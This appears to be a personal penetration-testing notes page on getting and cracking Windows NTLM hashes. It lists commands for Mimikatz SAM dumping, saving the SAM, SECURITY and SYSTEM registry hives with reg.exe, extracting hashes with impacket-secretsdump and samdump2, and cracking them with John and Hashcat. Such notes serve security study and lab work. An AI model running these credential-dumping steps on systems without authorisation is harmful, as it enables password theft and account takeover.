---
title: NTLM
parent: Operating Systems
layout: default
nav_order: 1
---

If cannot crack, maybe can consider pass the hash.

## Mimikatz
1. To obtain this from running system, need to have admin rights and run mimikatz.\
   `privilege::debug`\
   `token::elevate`\
   `lsadump::sam`
2. `john --wordlist=/usr/share/seclists/rockyou.txt hash.txt --format=NT`
   

## Registry (REG SAVE)
1. On target, run:\
   `reg.exe save hklm\sam sam.save`\
   `reg.exe save hklm\security security.save`\
   `reg.exe save hklm\system system.save`
2. Then run:\
   `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL`
3. If no security.save use (try not to):\
   `samdump2 system.save sam.save`
4. The NT hash is 4th item. Can also use John:\
   `john --wordlist=/usr/share/seclists/rockyou.txt hash.txt --format=NT`
5. Hashcat:\
   `hashcat -m 1000 -a 0 hash.txt /usr/share/seclists/rockyou.txt`